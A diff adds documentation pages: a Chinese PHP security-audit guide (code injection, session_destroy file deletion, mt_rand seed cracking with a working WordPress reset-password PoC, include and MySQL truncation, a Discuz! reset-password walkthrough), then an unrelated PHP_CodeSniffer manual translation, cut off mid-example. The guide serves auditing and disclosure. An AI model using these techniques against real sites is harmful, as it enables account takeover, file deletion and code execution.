+foreach ($_GET AS $key => $value)
+{
+        print $key;
+}
+?>
+
+</code>
+
+以上的代码看上去很完美，但是他这个代码里addslashes($value)只处理了变量的具体的值，但是没有处理变量本身的key，上面的代码显示结果如下：
+
+<code>
+Array
+(
+    [aaa'aa] => 1\'
+)
+aaa'aa
+
+</code>
+
+漏洞审计策略
+PHP版本要求：无
+
+系统要求：无
+
+审计策略：通读代码
+
+
+
+===== 代码注射 =====
+==== PHP中可能导致代码注射的函数 ====
+很多人都知道eval、preg_replace+/e可以执行代码，但是不知道php还有很多的函数可以执行代码如：
+
+
+其他可执行代码函数
+assert()
+call_user_func()
+call_user_func_array()
+create_function()
+变量函数
+这里我们看看最近出现的几个关于create_function()代码执行漏洞的代码：
+
+
+<code>
+<?php
+//how to exp this code
+$sort_by=$_GET['sort_by'];
+$sorter='strnatcasecmp';
+$databases=array('test','test');
+$sort_function = '  return 1 * ' . $sorter . '($a["' . $sort_by . '"], $b["' . $sort_by . '"]);
+';
+usort($databases, create_function('$a, $b', $sort_function));
+
+</code>
+
+漏洞审计策略
+PHP版本要求：无
+
+系统要求：无
+
+审计策略：查找对应函数（assert,call_user_func,call_user_func_array,create_function等）
+
+==== 变量函数与双引号 ====
+对于单引号和双引号的区别，很多程序员深有体会，示例代码：
+
+
+<code>
+echo "$a\n";
+echo '$a\n';
+
+</code>
+
+我们再看如下代码：
+
+
+<code>
+//how to exp this code
+if($globals['bbc_email']){
+
+$text = preg_replace(
+                array("/\[email=(.*?)\](.*?)\[\/email\]/ies",
+                                "/\[email\](.*?)\[\/email\]/ies"),
+                array('check_email("$1", "$2")',
+                                'check_email("$1", "$1")'), $text);
+
+</code>
+
+另外很多的应用程序都把变量用""存放在缓存文件或者config或者data文件里，这样很容易被人注射变量函数。
+
+
+漏洞审计策略
+PHP版本要求：无
+
+系统要求：无
+
+审计策略：通读代码
+
+===== PHP自身函数漏洞及缺陷 =====
+==== PHP函数的溢出漏洞 ====
+大家还记得Stefan Esser大牛的Month of PHP         Bugs（MOPB见附录[2]）项目么，其中比较有名的要算是unserialize()，代码如下：
+
+
+<code>
+unserialize(stripslashes($HTTP_COOKIE_VARS[$cookiename . '_data']);
+
+</code>
+
+在以往的PHP版本里，很多函数都曾经出现过溢出漏洞，所以我们在审计应用程序漏洞的时候不要忘记了测试目标使用的PHP版本信息。
+
+
+漏洞审计策略
+PHP版本要求：对应fix的版本
+
+系统要求：无
+
+审计策略：查找对应函数名
+
+==== PHP函数的其他漏洞 ====
+Stefan Esser大牛发现的漏洞：unset()--Zend_Hash_Del_Key_Or_Index         Vulnerability
+
+
+比如phpwind早期的serarch.php里的代码：
+
+
+<code>
+unset($uids);
+......
+$query=$db->query("SELECT uid FROM pw_members WHERE username LIKE '$pwuser'");
+while($member=$db->fetch_array($query)){
+        $uids .= $member['uid'].',';
+}
+$uids ? $uids=substr($uids,0,-1) : $sqlwhere.=' AND 0 ';
+........
+$query = $db->query("SELECT DISTINCT t.tid FROM $sqltable WHERE $sqlwhere $orderby $limit");
+
+</code>
+
+漏洞审计策略
+PHP版本要求：php4<4.3 php5<5.14
+
+系统要求：无
+
+审计策略：查找unset
+
+==== session_destroy()删除文件漏洞 ====
+这个漏洞是几年前朋友saiy发现的
+测试PHP版本：5.1.2
+
+，session_destroy()函数的功能是删除session文件，很多web应用程序的logout的功能都直接调用这个函数删除session，但是这个函数在一些老的版本中缺少过滤导致可以删除任意文件。测试代码如下：
+
+
+<code>
+<?php 
+//val.php   
+session_save_path('./');
+session_start();
+if($_GET['del']) {
+        session_unset();
+        session_destroy();
+}else{
+        $_SESSION['hei']=1;
+        echo(session_id());
+        print_r($_SESSION);
+}
+?>
+
+</code>
+
+当我们提交构造cookie:PHPSESSID=/../1.php，相当于unlink('sess`_`/../1.php')这样就通过注射../转跳目录删除任意文件了。很多著名的程序某些版本都受影响如phpmyadmin，sablog，phpwind3等等。
+
+
+漏洞审计策略
+PHP版本要求：具体不详
+
+系统要求：无
+
+审计策略：查找session_destroy
+
+==== 随机函数 ====
+  - rand() VS mt_rand()
+
+<code>
+//on windows
+print mt_getrandmax(); //2147483647
+print getrandmax();// 32767
+
+</code>
+
+可以看出rand()最大的随机数是32767，这个很容易被我们暴力破解。
+
+<code>
+<?php
+$a= md5(rand());
+for($i=0;$i<=32767;$i++){
+  if(md5($i) ==$a ) {
+   print $i."-->ok!!<br>";exit;
+   }else { print $i."<br>";}
+}
+?>
+
+</code>
+
+当我们的程序使用rand处理session时，攻击者很容易暴力破解出你的session，但是对于mt_rand是很难单纯的暴力的。
+
+漏洞审计策略
+PHP版本要求：无
+
+系统要求：无
+
+审计策略：查找rand
+
+  - mt_srand()/srand()-weak seeding（by Stefan Esser）
+
+看php手册里的描述：
+
+<code>
+mt_srand
+(PHP 3 >= 3.0.6, PHP 4, PHP 5)
+
+mt_srand -- 播下一个更好的随机数发生器种子
+说明
+void mt_srand ( int seed )
+
+</code>
+
+用 seed 来给随机数发生器播种。从 PHP 4.2.0 版开始，seed             参数变为可选项，当该项为空时，会被设为随时数。
+
+例子 1. mt_srand() 范例
+
+<code>
+<?php
+// seed with microseconds
+function make_seed()
+{
+    list($usec, $sec) = explode(' ', microtime());
+    return (float) $sec + ((float) $usec * 100000);
+}
+mt_srand(make_seed());
+$randval = mt_rand();
+?> 
+</code>
+
+== Poznámka:  ==
+自 PHP 4.2.0 起，不再需要用 srand() 或 mt_srand()               函数给随机数发生器播种，现已自动完成。
+
+php从4.2.0开始实现了自动播种，但是为了兼容，后来使用类似于这样的代码播种：
+
+<code>
+mt_srand ((double) microtime() * 1000000)
+
+</code>
+
+但是使用(double)microtime()`*`1000000类似的代码seed是比较脆弱的：
+
+<code>
+0<(double) microtime()<1 ---> 0<(double) microtime()* 1000000<1000000
+
+</code>
+
+那么很容易暴力破解,测试代码如下：
+
+<code>
+<?php
+/////////////////
+//>php rand.php
+//828682
+//828682
+////////////////
+ini_set("max_execution_time",0);
+$time=(double) microtime()* 1000000;
+print $time."\n";
+mt_srand ($time);
+
+$search_id = mt_rand();
+$seed = search_seed($search_id);
+print $seed;
+function search_seed($rand_num) {
+$max = 1000000;
+for($seed=0;$seed<=$max;$seed++){
+        mt_srand($seed);
+        $key = mt_rand();
+        if($key==$rand_num) return $seed;
+}
+return false;
+}
+?>
+
+</code>
+
+从上面的代码实现了对seed的破解，另外根据Stefan             Esser的分析seed还根据进程变化而变化，换句话来说同一个进程里的seed是相同的。             然后同一个seed每次mt_rand的值都是特定的。如下表：
+
+seed-A
+seed-B
+mt_rand-A-1
+mt_rand-B-1
+mt_rand-A-2
+mt_rand-B-2
+mt_rand-A-3
+mt_rand-B-3
+对于seed-A里mt_rand-1/2/3都是不相等的，但是值都是特定的，也就是说当seed-A等于seed-B，那么mt_rand-A-1就等于mt_rand-B-1…，这样我们只要能够得到seed就可以得到每次mt_rand的值了。
+
+对于5.2.6>php>4.2.0直接使用默认播种的程序也是不安全的（很多的安全人员错误的以为这样就是安全的），这个要分两种情况来分析：
+
+第一种：'Cross Application Attacks'，这个思路在Stefan             Esser文章里有提到，主要是利用其他程序定义的播种（如mt_srand ((double) microtime()`*`             1000000)），phpbb+wordpree组合就存在这样的危险.
+
+第二种：5.2.6>php>4.2.0默认播种的算法也不是很强悍，这是Stefan             Esser的文章里的描述：
+
+The Implementation<br>When mt_rand() is seeded               internally or by a call to mt_srand() PHP 4 and PHP 5 <=               5.2.0 force the lowest bit to 1. Therefore the strength of the               seed is only 31 and not 32 bits. In PHP 5.2.1 and above the               implementation of the Mersenne Twister was changed and the               forced bit removed.
+
+在32位系统上默认的播种的种子为最大值是`2^32`，这样我们循环最多`2^32`次就可以破解seed。而在PHP             4和PHP 5 <= 5.2.0 的算法有个bug：奇数和偶数的播种是一样的（详见附录[3]）,测试代码如下：
+
+<code>
+<?php
+mt_srand(4); 
+$a = mt_rand(); 
+mt_srand(5); 
+$b = mt_rand();
+print $a."\n".$b;
+?>
+
+</code>
+
+通过上面的代码发现$a==$b，所以我们循环的次数为2^32/2=2^31次。我们看如下代码：
+
+<code>
+<?php
+//base on http://www.milw0rm.com/exploits/6421 
+//test on php 5.2.0
+
+define('BUGGY', 1); //上面代码$a==$b时候定义BUGGY=1
+
+$key = wp_generate_password(20, false);
+echo $key."\n";
+$seed = getseed($key);
+print $seed."\n"; 
+
+mt_srand($seed);
+$pass = wp_generate_password(20, false);
+echo $pass."\n";        
+        
+function wp_generate_password($length = 12, $special_chars = true) {
+        $chars = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789';
+        if ( $special_chars )
+                $chars .= '!@#$%^&*()';
+
+        $password = '';
+        for ( $i = 0; $i < $length; $i++ )
+                $password .= substr($chars, mt_rand(0, strlen($chars) - 1), 1);
+        return $password;
+} 
+
+function getseed($resetkey) {
+        $max = pow(2,(32-BUGGY));
+        for($x=0;$x<=$max;$x++) {
+                $seed = BUGGY ? ($x << 1) + 1 : $x; 
+                mt_srand($seed);
+                $testkey = wp_generate_password(20,false);
+                if($testkey==$resetkey) { echo "o\n"; return $seed; }
+
+                if(!($x % 10000)) echo $x / 10000;
+        }
+        echo "\n";
+        return false;
+}
+?>
+
+</code>
+
+运行结果如下：
+
+<code>
+php5>php rand.php
+M8pzpjwCrvVt3oobAaOr
+0123456789101112131415161718192021222324252627282930313233343536373839404142434
+445464748495051525354555657585960616263646566676869
+7071727374757677787980818283848586878889909192939495969798991001011021031041051
+061071081091101111121131141151161171181191201211221
+2312412512612712812913013113213313413513613713813914014114214314414514614714814
+915015115215315415515615715815916016116216316416516
+6167168169170171172173174175176177178179180181182183184185186187188189190191192
+193194195196197198199200201202203204205206207208209
+2102112122132142152162172182192202212222232242252262272282292302312322332342352
+362372382392402412422432442452462472482492502512522
+..............01062110622106231062410625106261062710628106291063010631106321063
+3o
+70693
+pjwCrvVt3oobAaOr
+
+</code>
+
+当10634次时候我们得到了结果。
+
+当PHP版本到了5.2.1后，通过修改算法修补了奇数和偶数的播种相等的问题，这样也导致了php5.2.0前后导致同一个播种后的mt_rand()的值不一样。比如：
+
+<code>
+<?php
+mt_srand(42);
+echo mt_rand();
+//php<=5.20 1387371436
+//php>5.20 1354439493
+?>
+
+</code>
+
+正是这个原因，也要求了我们的exp的运行环境：当目标>5.20时候，我们exp运行的环境也要是>5.20的版本，反过来也是一样。
+
+从上面的测试及分析来看，php<5.26不管有没有定义播种，mt_rand处理的数据都是不安全的。在web应用里很多都使用mt_rand来处理随机的session，比如密码找回功能等等，这样的后果就是被攻击者恶意利用直接修改密码。
+
+很多著名的程序都产生了类似的漏洞如wordpress、phpbb、punbb等等。（在后面我们将实际分析下国内著名的bbs程序Discuz!的mt_srand导致的漏洞）
+
+漏洞审计策略
+PHP版本要求：php4 php5<5.2.6
+
+系统要求：无
+
+审计策略：查找mt_srand/mt_rand
+
+===== 特殊字符 =====
+其实“特殊字符”也没有特定的标准定义，主要是在一些code       hacking发挥着特殊重作用的一类字符。下面就举几个例子：
+
+==== 截断 ====
+其中最有名的数大家都熟悉的null字符截断。
+
+=== include截断 ===
+<code>
+<?php 
+include $_GET['action'].".php"; 
+?>
+
+</code>
+
+提交“action=/etc/passwd%00”中的“%00”将截断后面的“.php”，但是除了“%00”还有没有其他的字符可以实现截断使用呢？肯定有人想到了远程包含的url里问号“?”的作用，通过提交“action=`http://www.hacksite.com/evil-code.txt`?”这里“?”实现了“伪截断”：），好象这个看上去不是那么舒服那么我们简单写个代码fuzz一下：
+
+
+<code>
+<?php
+////////////////////
+////var5.php代码:
+////include $_GET['action'].".php"; 
+////print strlen(realpath("./"))+strlen($_GET['action']);  
+///////////////////
+ini_set('max_execution_time', 0);
+$str='';
+for($i=0;$i<50000;$i++)
+{
+        $str=$str."/";
+
+        $resp=file_get_contents('http://127.0.0.1/var/var5.php?action=1.txt'.$str);
+        //1.txt里的代码为print 'hi';
+        if (strpos($resp, 'hi') !== false){
+                print $i;
+                exit;
+        }
+}
+?>
+
+</code>
+
+经过测试字符“.”、“           /”或者2个字符的组合，在一定的长度时将被截断，win系统和`*`nix的系统长度不一样，当win下strlen(realpath("./"))+strlen($`_`GET`['action']`)的长度大于256时被截断，对于`*`nix的长度是4           `*` 1024 =           4096。对于php.ini里设置远程文件关闭的时候就可以利用上面的技巧包含本地文件了。（此漏洞由cloie#ph4nt0m.org最先发现]）
+
+
+=== 数据截断 ===
+对于很多web应用文件在很多功能是不容许重复数据的，比如用户注册功能等。一般的应用程序对于提交注册的username和数据库里已有的username对比是不是已经有重复数据，然而我们可以通过“数据截断”等来饶过这些判断，数据库在处理时候产生截断导致插入重复数据。
+
+  - Mysql SQL Column Truncation Vulnerabilities
+
+这个漏洞又是大牛Stefan Esser发现的（Stefan               Esser是我的偶像:)），这个是由于mysql的sql_mode设置为default的时候，即没有开启STRICT_ALL_TABLES选项时，MySQL对于插入超长的值只会提示warning，而不是error（如果是error就插入不成功），这样可能会导致一些截断问题。测试如下：
+
+<code>
+mysql> insert into truncated_test(`username`,`password`) values("admin","pass");
+
+mysql> insert into truncated_test(`username`,`password`) values("admin           x", "new_pass");
+Query OK, 1 row affected, 1 warning (0.01 sec)
+
+mysql> select * from truncated_test;
++----+------------+----------+
+| id | username   | password |
++----+------------+----------+
+| 1 | admin      | pass     |
+| 2 | admin      | new_pass |
++----+------------+----------+
+2 rows in set (0.00 sec)
+
+</code>
+
+  - Mysql charset Truncation vulnerability
+
+这个漏洞是80sec发现的，当mysql进行数据存储处理utf8等数据时对某些字符导致数据截断。测试如下：
+
+<code>
+mysql> insert into truncated_test(`username`,`password`) values(concat("admin",0xc1), "new_pass2");
+Query OK, 1 row affected, 1 warning (0.00 sec)
+
+mysql> select * from truncated_test;
++----+------------+----------+
+| id | username   | password |
++----+------------+----------+
+| 1 | admin      | pass      |
+| 2 | admin      | new_pass  |
+| 3 | admin      | new_pass2 |
++----+------------+----------+
+2 rows in set (0.00 sec)
+
+</code>
+
+很多的web应用程序没有考虑到这些问题，只是在数据存储前简单查询数据是否包含相同数据，如下代码：
+
+<code>
+$result = mysql_query("SELECT * from test_user where user='$user' ");
+  ....
+if(@mysql_fetch_array($result, MYSQL_NUM)) {
+        die("already exist");
+}
+
+</code>
+
+漏洞审计策略
+PHP版本要求：无
+
+系统要求：无
+
+审计策略：查找mt_srand/mt_rand
+
+=== 文件操作里的特殊字符 ===
+文件操作里有很多特殊的字符，发挥特别的作用，很多web应用程序没有注意处理这些字符而导致安全问题。比如很多人都知道的windows系统文件名对“空格”和“.”等的忽视，这个主要体现在上传文件或者写文件上，导致直接写webshell。另外对于windows系统对“.\..\”进行系统转跳等等。
+
+
+下面还给大家介绍一个非常有意思的问题：
+
+
+<code>
+//Is this code vul?
+if( eregi(".php",$url) ){
+        die("ERR");
+}
+$fileurl=str_replace($webdb[www_url],"",$url);
+.....
+header('Content-Disposition: attachment; filename='.$filename);
+
+</code>
+
+很多人看出来了上面的代码的问题，程序首先禁止使用“.php”后缀。但是下面居然接了个str_replace替换$webdb[www_url]为空，那么我们提交“.p$webdb[www_url]hp”就可以饶过了。那么上面的代码杂fix呢？有人给出了如下代码：
+
+
+<code>
+$fileurl=str_replace($webdb[www_url],"",$url);
+if( eregi(".php",$url) ){
+     die("ERR");
+}
+
+</code>
+
+str_replace提到前面了，很完美的解决了str_replace代码的安全问题，但是问题不是那么简单，上面的代码在某些系统上一样可以突破。接下来我们先看看下面的代码：
+
+
+<code>
+<?php
+for($i=0;$i<255;$i++) {
+        $url = '1.ph'.chr($i);
+        $tmp = @file_get_contents($url);
+        if(!empty($tmp)) echo chr($i)."\r\n";
+}  
+?>
+
+</code>
+
+我们在windows系统运行上面的代码得到如下字符`*` < > ? P           p都可以打开目录下的1.php。
+
+
+漏洞审计策略
+PHP版本要求：无
+
+系统要求：无
+
+审计策略：文读取件操作函数
+
+====== 怎么进一步寻找新的字典 ======
+上面我们列举很多的字典，但是很多都是已经公开过的漏洞或者方式，那么我们怎么进一步找到新的字典或者利用方式呢？
+
+分析和学习别人发现的漏洞或者exp，总结出漏洞类型及字典
+通过学习php手册或者官方文档,挖掘出新的有危害的函数或者利用方式
+fuzz       php的函数，找到新的有问题的函数（不一定非要溢出的），如上一章的4.6的部分很多都可以简单的fuzz脚本可以测试出来
+分析php源代码，发现新的漏洞函数“特性”或者漏洞。（在上一节里介绍的那些“漏洞审计策略”里，都没有php源代码的分析，如果你要进一步找到新的字典，可以在php源代码的基础上分析下成因，然后根据这个成因来分析寻找新的漏洞函数“特性”或者漏洞。）（我们以后会陆续公布一些我们对php源代码的分析）
+有条件或者机会和开发者学习，找到他们实现某些常用功能的代码的缺陷或者容易忽视的问题
+你有什么要补充的吗？ ：）
+====== DEMO ======
+
+Tabulka: **DEMO**
+
+|*DEMO -- Discuz! Reset User Password 0day Vulnerability             分析<br>（Exp:[http://www.80vul.com/dzvul/sodb/14/sodb-2008-14.txt]）*|
+|PHP版本要求:php4 php5<5.2.6<br>系统要求:             无<br>审计策略:查找mt_srand/mt_rand|
+第一步 安装Discuz! 6.1后利用grep查找mt_srand得到：
+
+
+<code>
+heige@heige-desktop:~/dz6/upload$ grep -in 'mt_srand' -r ./ --colour -5
+./include/global.func.php-694-  $GLOBALS['rewritecompatible'] && $name = rawurlencode($name);
+./include/global.func.php-695-  return '<a href="tag-'.$name.'.html"'.stripslashes($extra).'>';
+./include/global.func.php-696-}
+./include/global.func.php-697-
+./include/global.func.php-698-function random($length, $numeric = 0) {
+./include/global.func.php:699:  PHP_VERSION < '4.2.0' && mt_srand((double)microtime() * 1000000);
+./include/global.func.php-700-  if($numeric) {
+./include/global.func.php-701-          $hash = sprintf('%0'.$length.'d', mt_rand(0, pow(10, $length) - 1));
+./include/global.func.php-702-  } else {
+./include/global.func.php-703-          $hash = '';
+./include/global.func.php-704-          $chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789abcdefghijklmnopqrstuvwxyz';
+--
+./include/discuzcode.func.php-30-
+./include/discuzcode.func.php-31-if(!isset($_DCACHE['bbcodes']) || !is_array($_DCACHE['bbcodes']) || !is_array($_DCACHE['smilies'])) {
+./include/discuzcode.func.php-32-       @include DISCUZ_ROOT.'./forumdata/cache/cache_bbcodes.php';
+./include/discuzcode.func.php-33-}
+./include/discuzcode.func.php-34-
+./include/discuzcode.func.php:35:mt_srand((double)microtime() * 1000000);
+./include/discuzcode.func.php-36-
+./include/discuzcode.func.php-37-function attachtag($pid, $aid, &$postlist) {
+./include/discuzcode.func.php-38-       global $attachrefcheck, $thumbstatus, $extcredits, $creditstrans, $ftp, $exthtml;
+./include/discuzcode.func.php-39-       $attach = $postlist[$pid]['attachments'][$aid];
+./include/discuzcode.func.php-40-       if($attach['attachimg']) {
+
+</code>
+
+有两个文件用到了mt_srand()，第1是在./include/global.func.php的随机函数random()里：
+
+
+<code>
+PHP_VERSION < '4.2.0' && mt_srand((double)microtime() * 1000000);
+
+</code>
+
+判断了版本，如果是PHP_VERSION >     '4.2.0'使用php本身默认的播种。从上一章里的分析我们可以看得出来，使用php本身默认的播种的分程序两种情况：
+
+
+  - 'Cross Application Attacks'         这个思路是只要目标上有使用使用的程序里定义了类似mt_srand((double)microtime() `*`         1000000)的播种的话，又很有可能被暴力。在dz这里不需要Cross         Application，因为他本身有文件就定义了，就是上面的第2个文件：
+
+<code>
+./include/discuzcode.func.php:35:mt_srand((double)microtime() * 1000000);
+
+</code>
+
+这里我们肯定dz是存在这个漏洞的，文章给出来的exp也就是基于这个的。（具体exp利用的流程有兴趣的可以自己分析下]）
+
+  - 有的人认为如果没有mt_srand((double)microtime() `*`         1000000);这里的定义，那么dz就不存在漏洞，这个是不正确的。首先你不可以保证别人使用的其他应用程序没有定义，再次不利用'Cross         Application Attacks'，5.2.6>php>4.2.0         php本身默认播种的算法也不是很强悍（分析详见上），也是有可以暴力出来，只是速度要慢一点。
+====== 后话 ======
+本文是80vul的三大马甲：80vul-A，80vul-B，80vul-C集体智慧的结晶，尤其是80vul-B贡献了不少新发现。另外需要感谢的是文章里提到的那些漏洞的发现者，没有他们的成果也就没有本文。本文没有写“参考”，因为本文是一个总结性的文挡，有太多的连接需要提供限于篇幅就没有一一列举，有心的读者可以自行google。另外原本没有打算公布此文，因为里面包含了太多应用程序的0day，而且有太多的不尊重别人成果的人，老是利用从别人那学到的技术来炫耀，甚至牟取利益。在这里我们希望你可以在本文里学到些东西，更加希望如果通过本文你找到了某些应用程序的0day，请低调处理，或者直接提交给官方修补，谢谢大家！！
+
+http://www.php-security.org/
+http://bugs.php.net/bug.php?id=40114
+====== 介绍 ======
+作者介绍
+作者：Greg Sherwood
+
+
+联系：
+**在线联系**
+
+网站：
+**http://gregsherwood.blogspot.com/**
+
+文章出处：
+**http://pear.php.net/package/PHP_CodeSniffer/docs**
+
+最后更新：2010-07-18
+
+
+译者介绍
+MoXie(moxie@zoeey.org),
+**http://zoeey.org**.
+
+描述
+PHP_CodeSniffer 是一个基于PHP5的代码静态分析工具。支持对 PHP、JavaScript 和 CSS       文件的代码规范检测，在代码质量控制中充当着重要的角色。它甚至可以帮你检测出语义上的错误。
+
+
+在 PHP_CodeSniffer 中，代码规范由一系列 
+sniff
+ 文件组成。各个       
+sniff
+       负责定义不同部分的代码规范。支持多种代码规范，可同时以不同规范检测多个工程。其默认使用的规范为       
+PEAR
+ 。
+
+
+安装
+  ;Pear 方式安装 : <code>
+$ pear install PHP_CodeSniffer
+</code>
+
+  ;下载安装 : 打开 
+**http://pear.php.net/package/PHP_CodeSniffer/**             查看 Current Release项。建议下载最新stable版本（本文翻译测试使用：1.2.2）。
+
+下载解压后将phpcs(phpcs.bat)的目录加入PATH即可。
+
+
+范例
+使用 
+PEAR
+ 的代码规范检测单个文件：
+
+
+<code>
+// Checking a file with PHP_CodeSniffer
+
+$ phpcs /path/to/code/myfile.php
+
+FILE: /path/to/code/myfile.php
+--------------------------------------------------------------------------------
+FOUND 5 ERROR(S) AFFECTING 2 LINE(S)
+--------------------------------------------------------------------------------
+  2 | ERROR | Missing file doc comment
+ 20 | ERROR | PHP keywords must be lowercase; expected "false" but found "FALSE"
+ 47 | ERROR | Line not indented correctly; expected 4 spaces but found 1
+ 51 | ERROR | Missing function doc comment
+ 88 | ERROR | Line not indented correctly; expected 9 spaces but found 6
+--------------------------------------------------------------------------------
+</code>
+
+检查目录下的所有文件：
+
+
+<code>
+// Checking a directory with PHP_CodeSniffer
+
+
+$ phpcs /path/to/code
+
+FILE: /path/to/code/myfile.php
+--------------------------------------------------------------------------------
+FOUND 5 ERROR(S) AFFECTING 5 LINE(S)
+--------------------------------------------------------------------------------
+  2 | ERROR | Missing file doc comment
+ 20 | ERROR | PHP keywords must be lowercase; expected "false" but found "FALSE"
+ 47 | ERROR | Line not indented correctly; expected 4 spaces but found 1
+ 51 | ERROR | Missing function doc comment
+ 88 | ERROR | Line not indented correctly; expected 9 spaces but found 6
+--------------------------------------------------------------------------------
+
+FILE: /path/to/code/yourfile.php
+--------------------------------------------------------------------------------
+FOUND 1 ERROR(S) AND 1 WARNING(S) AFFECTING 1 LINE(S)
+--------------------------------------------------------------------------------
+ 21 | ERROR   | PHP keywords must be lowercase; expected "false" but found
+    |         | "FALSE"
+ 21 | WARNING | Equals sign not aligned with surrounding assignments
+--------------------------------------------------------------------------------
+</code>
+
+====== 准备工具 ======
+你所需要准备的工具。
+
+PHP_CodeSniffer
+PHP_CodeSniffer 需要 5.1.2 或更高版本的支持。
+
+== Poznámka:  ==
+个别特殊 
+sniff
+ 文件可能需要其他脚本或应用程序的支持。 具体情况请参阅
+**查看配置**选项章节。
+
+SVN pre-commit hook
+为了识别“垂直空白字符”
+原文为：vertical whitespace character，即 "\v"。
+
+，需要 PHP 5.2.4 以上支持。
+
+====== 使用 ======
+基本使用说明
+
+获取命令行帮助信息
+使用 
+-h
+ 或 
+--help
+ 选项可以获取     
+phpcs
+ 所有选项参数的说明：
+
+<code>
+Usage: phpcs [-nwlsavi] [--extensions=<extensions>] [--ignore=<patterns>]
+    [--report=<report>] [--report-width=<reportWidth>] [--report-file=<reportfile>]
+    [--severity=<severity>] [--error-severity=<severity>] [--warning-severity=<severity>]
+    [--config-set key value] [--config-delete key] [--config-show]
+    [--standard=<standard>] [--sniffs=<sniffs>]
+    [--generator=<generator>] [--tab-width=<tabWidth>] <file> ...
+        -n            Do not print warnings (shortcut for --warning-severity=0)
+        -w            Print both warnings and errors (on by default)
+        -l            Local directory only, no recursion
+        -s            Show sniff codes in all reports
+        -a            Run interactively
+        -v[v][v]      Print verbose output
+        -i            Show a list of installed coding standards
+        --help        Print this help message
+        --version     Print version information
+        <file>        One or more files and/or directories to check
+        <extensions>  A comma separated list of file extensions to check
+                      (only valid if checking a directory)
+        <patterns>    A comma separated list of patterns that are used
+                      to ignore directories and files
+        <sniffs>      A comma separated list of sniff codes to limit the check to
+                      (all sniffs must be part of the specified standard)
+        <severity>    The minimum severity that an error or warning must have
+                      for it to be displayed.
+        <standard>    The name of the coding standard to use
+        <tabWidth>    The number of spaces each tab represents
+        <generator>   The name of a doc generator to use
+                      (forces doc generation instead of checking)
+        <report>      Print either the "full", "xml", "checkstyle",
+                      "csv", "emacs", "source", "summary",
+                      "svnblame" or "gitblame" report
+                      (the "full" report is printed by default)
+        <reportWidth> How many columns wide screen reports should be printed
+        <reportfile>  Write the report to the specified file path
+                      (report is also written to screen)
+
+
+</code>
+
+== Poznámka:  ==
+如果你安装了多个代码规范，可以通过 
+--standard
+       选项来设置当前需要使用的。如果你没有设定此选项，默认将使用 
+PEAR
+       代码规范，或者你设置的其他默认规范。查看如何
+**设置默认代码规范**。
+
+检测文件或目录
+最简单的方式是直接将需要检测的文件路径放在参数中。如果提供的是一个文件目录，PHP_CodeSniffer     将会检测包括子目录下的所有文件。 
+
+
+== Poznámka:  ==
+在检测目录时如果你不需要对子目录进行检测，可以使用
+ -l 
+选项。
+
+在下面的例子中第一行命令表述如何检测 
+myfile.inc
+ 文件，第二行则表示如何检测     
+my_dir
+ 目录。
+
+
+<code>
+Checking a single file or folder
+
+
+$ phpcs /path/to/code/myfile.inc
+$ phpcs /path/to/code/my_dir
+
+</code>
+
+你也可以同时检测多个文件或目录。下面的例子表述了如何同时检测 
+myfile.inc
+ 文件和     
+my_dir
+ 目录。
+
+
+<code>
+Checking multiple files and folders
+
+
+$ phpcs /path/to/code/myfile.inc /path/to/code/my_dir
+</code>
+
+PHP_CodeSniffer在检测完毕时会打印出一份警告和错误报告，汇报当前文件对指定代码规范的执行情况。示例报告如下：
+
+
+<code>
+Sample PHP_CodeSniffer output
+
+
+$ phpcs /path/to/code/myfile.php
+
+FILE: /path/to/code/myfile.php
+--------------------------------------------------------------------------------
+FOUND 5 ERROR(S) AND 1 WARNING(S) AFFECTING 5 LINE(S)
+--------------------------------------------------------------------------------
+  2 | ERROR   | Missing file doc comment
+ 20 | ERROR   | PHP keywords must be lowercase; expected "false" but found
+    |         | "FALSE"
+ 47 | ERROR   | Line not indented correctly; expected 4 spaces but found 1
+ 47 | WARNING | Equals sign not aligned with surrounding assignments
+ 51 | ERROR   | Missing function doc comment
+ 88 | ERROR   | Line not indented correctly; expected 9 spaces but found 6
+--------------------------------------------------------------------------------
+</code>
+
+你可以使用 
+-n
+ 选项来去除 
+WARNING
+     的条目。
+
+
+<code>
+Sample PHP_CodeSniffer output with no warnings
+
+
+$ phpcs -n /path/to/code/myfile.php
+
+FILE: /path/to/code/myfile.php
+--------------------------------------------------------------------------------
+FOUND 5 ERROR(S) AFFECTING 5 LINE(S)
+--------------------------------------------------------------------------------
+  2 | ERROR | Missing file doc comment
+ 20 | ERROR | PHP keywords must be lowercase; expected "false" but found "FALSE"
+ 47 | ERROR | Line not indented correctly; expected 4 spaces but found 1
+ 51 | ERROR | Missing function doc comment
+ 88 | ERROR | Line not indented correctly; expected 9 spaces but found 6
+--------------------------------------------------------------------------------
+</code>
+
+打印摘要报告
+PHP_CodeSniffer     默认会将所有检测出的警告和错误打印出来。很多时候一个文件就非常的冗长，尤其是在同时检测多个文件时这个文件将更为突出。你可以使用     
+--report=summary
+ 选项来打印出各个文件名警告和错误个数。示例报告如下：
+
+
+<code>
+Sample PHP_CodeSniffer summary output
+
+
+$ phpcs --report=summary /path/to/code
+
+PHP CODE SNIFFER REPORT SUMMARY
+--------------------------------------------------------------------------------
+FILE                                                            ERRORS  WARNINGS
+--------------------------------------------------------------------------------
+/path/to/code/myfile.inc                                        5       0
+/path/to/code/yourfile.inc                                      1       1
+/path/to/code/ourfile.inc                                       0       2
+--------------------------------------------------------------------------------
+A TOTAL OF 6 ERROR(S) AND 3 WARNING(S) WERE FOUND IN 3 FILE(S)
+--------------------------------------------------------------------------------
+</code>
+
+同时可以使用 
+-n
+ 选项来剔除警告。
+
+
+<code>
+Sample PHP_CodeSniffer summary output with no warnings
+
+
+$ phpcs -n --report=summary /path/to/code
+
+PHP CODE SNIFFER REPORT SUMMARY
+--------------------------------------------------------------------------------
+FILE                                                                      ERRORS
+--------------------------------------------------------------------------------
+/path/to/code/myfile.inc                                                  5
+/path/to/code/yourfile.inc                                                1
+--------------------------------------------------------------------------------
+A TOTAL OF 6 ERROR(S) WERE FOUND IN 2 FILE(S)
+--------------------------------------------------------------------------------
+</code>
+
+输出详细
+PHP_CodeSniffer 默认使用静默模式来执行命令，只有在执行结束时才打印警告和错误报告。     在检测大量文件时，你得等候很长时间才能看到最终的检测见报告。这时如果你想观察程序正在检测什么内容，可以使用     
+-v
+ 选项来开启详细模式。
+
+
+详细模式开启时PHP_CodeSniffer会将当前检测的的文件名、token数量和代码行数逐一报告出来。示例输出如下：
+
+
+<code>
+Sample PHP_CodeSniffer verbose output
+
+
